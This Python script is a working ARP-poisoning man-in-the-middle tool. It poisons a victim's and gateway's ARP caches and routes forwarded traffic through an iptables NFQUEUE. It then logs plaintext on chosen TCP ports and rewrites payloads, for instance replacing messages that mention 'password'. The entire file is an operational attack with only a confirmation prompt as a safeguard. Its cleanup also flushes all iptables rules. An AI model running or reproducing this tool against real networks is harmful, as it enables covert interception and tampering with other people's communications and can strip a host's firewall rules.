#!/usr/bin/env python3
"""
TCP Socket Interceptor - Custom extension for intercepting Java/Python socket communication
Extends the existing ARP MITM attack to intercept custom TCP protocols
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import re
import logging
from datetime import datetime

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig

# Use configuration values
victim_ip = AttackConfig.VICTIM_IP
gateway_ip = AttackConfig.GATEWAY_IP
interface = NetworkConfig.INTERFACE
victim_mac = AttackConfig.VICTIM_MAC
gateway_mac = AttackConfig.GATEWAY_MAC

# Custom configuration for socket interception
SOCKET_PORTS = [9999, 8080, 12345]  # Ports to intercept
ENABLE_SOCKET_MODIFICATION = True

# Setup detailed logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('tcp_socket_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def enable_ip_forwarding():
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                logger.info("[SETUP] ✅ IP forwarding enabled successfully")
            else:
                logger.warning("[SETUP] ⚠️ IP forwarding may not be enabled")
    except:
        logger.warning("[SETUP] Could not verify IP forwarding status")

def disable_ip_forwarding():
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, victim_mac, spoof_ip):
    pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(pkt, iface=interface, verbose=0)
    logger.debug(f"[ARP-POISON] Sent to {victim_ip} ({victim_mac}): {spoof_ip} is at {get_if_hwaddr(interface)}")

def restore(dest_ip, dest_mac, source_ip, source_mac):
    pkt = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(pkt, iface=interface, verbose=0, count=3)
    logger.info(f"[ARP-RESTORE] Restored {dest_ip} -> {source_ip} ({source_mac})")

def modify_socket_packet(packet):
    """Main packet modification function for TCP socket traffic"""
    scapy_pkt = IP(packet.get_payload())
    
    src_ip = scapy_pkt.src
    dst_ip = scapy_pkt.dst
    
    # Only process TCP packets with payload
    if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
        packet.accept()
        return

    tcp_layer = scapy_pkt[TCP]
    payload = scapy_pkt[Raw].load
    
    # Check if this traffic involves our target victims
    is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
    
    if not is_victim_traffic:
        packet.accept()
        return
    
    # Check if this is traffic on our target socket ports
    is_target_port = (tcp_layer.dport in SOCKET_PORTS or tcp_layer.sport in SOCKET_PORTS)
    
    if not is_target_port:
        packet.accept()
        return
        
    # Log all socket traffic
    logger.info(f"[SOCKET-TRAFFIC] 🎯 {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
    
    try:
        # Try to decode the payload as text
        message = payload.decode('utf-8', errors='ignore')
        
        if message.strip():
            logger.warning(f"[SOCKET-MESSAGE] 📨 Intercepted: '{message.strip()}'")
            
            if ENABLE_SOCKET_MODIFICATION:
                # Modify the message
                modified_message = modify_socket_message(message)
                
                if modified_message != message:
                    logger.info(f"[SOCKET-MODIFY] 🔧 Original: '{message.strip()}'")
                    logger.info(f"[SOCKET-MODIFY] 🔧 Modified: '{modified_message.strip()}'")
                    
                    # Update packet with modified payload
                    scapy_pkt[Raw].load = modified_message.encode('utf-8')
                    
                    # Recalculate checksums
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_pkt))
                    logger.info(f"[SOCKET-MODIFY] ✅ Message successfully modified!")
            
    except UnicodeDecodeError:
        # Handle binary data
        logger.info(f"[SOCKET-BINARY] 📦 Binary data: {len(payload)} bytes")
        
    packet.accept()

def modify_socket_message(original_message):
    """Modify socket messages - customize this function for your tests"""
    message = original_message
    
    # Example modifications
    if "hello" in message.lower():
        message = message.replace("hello", "INTERCEPTED_HELLO")
        message = message.replace("Hello", "INTERCEPTED_HELLO")
    
    if "password" in message.lower():
        message = message.replace(message.strip(), "HACKED_PASSWORD_123")
    
    if "secret" in message.lower():
        message = message.replace("secret", "INTERCEPTED_SECRET")
        message = message.replace("Secret", "INTERCEPTED_SECRET")
    
    # Add interception marker
    if message.strip() and message != original_message:
        message = f"[MITM_MODIFIED] {message}"
    
    return message

def start_socket_interception():
    """Start the TCP socket interception system"""
    logger.info("[SETUP] Setting up iptables rule for socket packet interception")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify iptables rule was added
    import subprocess
    try:
        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], capture_output=True, text=True)
        if 'NFQUEUE' in result.stdout:
            logger.info("[SETUP] ✅ iptables NFQUEUE rule successfully added")
        else:
            logger.warning("[SETUP] ⚠️ iptables rule may not have been added correctly")
    except:
        logger.warning("[SETUP] Could not verify iptables rule")
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_socket_packet)
    
    logger.info("[MITM] 🚀 TCP Socket interception system started")
    logger.info("[MITM] 📡 Monitoring socket traffic on ports: " + str(SOCKET_PORTS))
    logger.info(f"[MITM] 🎯 Target: {victim_ip} <-> {gateway_ip}")
    logger.info(f"[MITM] 🔧 Modification: {'Enabled' if ENABLE_SOCKET_MODIFICATION else 'Disabled'}")
    logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        logger.info("\n[MITM] 🛑 Stopping socket interceptor...")
    finally:
        nfqueue.unbind()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")

def display_configuration():
    """Display current attack configuration"""
    print("=" * 60)
    print("🎯 TCP SOCKET INTERCEPTION ATTACK CONFIGURATION")
    print("=" * 60)
    print(f"Interface:        {interface}")
    print(f"Target IP:        {victim_ip}")
    print(f"Target MAC:       {victim_mac}")
    print(f"Gateway IP:       {gateway_ip}")
    print(f"Gateway MAC:      {gateway_mac}")
    print(f"Socket Ports:     {SOCKET_PORTS}")
    print(f"Modification:     {'Enabled' if ENABLE_SOCKET_MODIFICATION else 'Disabled'}")
    print("=" * 60)
    
    if SecurityConfig.REQUIRE_CONFIRMATION:
        response = input("🤔 Proceed with socket interception attack? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("❌ Attack cancelled by user")
            sys.exit(0)

def main():
    """Main function"""
    display_configuration()
    
    logger.info("[ATTACK] 🚀 Starting ARP poisoning & TCP socket interception attack")
    logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
    
    enable_ip_forwarding()

    def exit_gracefully(signum, frame):
        logger.info("\n[CLEANUP] 🧹 Starting cleanup process...")
        logger.info("[CLEANUP] Restoring ARP tables...")
        
        # Restore ARP tables
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        
        disable_ip_forwarding()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start ARP poisoning in background
    def poison_loop():
        logger.info("[ARP-POISON] 🎯 Starting continuous ARP poisoning")
        logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
        
        poison_count = 0
        while True:
            # Poison victim: tell victim that gateway is at attacker's MAC
            poison(victim_ip, victim_mac, gateway_ip)
                
            # Poison gateway: tell gateway that victim is at attacker's MAC
            poison(gateway_ip, gateway_mac, victim_ip)
            
            poison_count += 2
            if poison_count % 10 == 0:
                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets")
            
            time.sleep(AttackConfig.ARP_POISON_INTERVAL)

    from threading import Thread
    poison_thread = Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Start socket packet interception
    start_socket_interception()

if __name__ == "__main__":
    main() 